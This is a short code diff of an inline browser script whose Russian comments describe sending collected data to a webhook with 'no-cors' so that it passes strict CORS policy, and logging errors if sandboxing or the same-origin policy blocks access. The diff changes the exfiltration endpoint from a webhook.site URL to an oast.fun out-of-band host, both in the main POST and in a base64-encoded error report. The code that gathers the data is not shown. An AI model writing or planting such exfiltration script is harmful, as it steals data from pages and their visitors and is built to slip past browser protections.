@@ -24,7 +24,7 @@
 
                 // 2. Отправляем на вебхук
                 // Используем mode: 'no-cors', чтобы запрос прошел даже при строгой политике CORS
-                fetch('https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6', {
+                fetch('https://zmsfeowzqscjsayavbfelncjzqdvcgxyz.oast.fun', {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: {
@@ -37,7 +37,7 @@
 
             } catch (error) {
                 // Логируем ошибки доступа, если сработал Sandboxing или SOP
-                fetch('https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?error=' + btoa(error.message));
+                fetch('https://zmsfeowzqscjsayavbfelncjzqdvcgxyz.oast.fun?error=' + btoa(error.message));
             }
         })();
     </script>
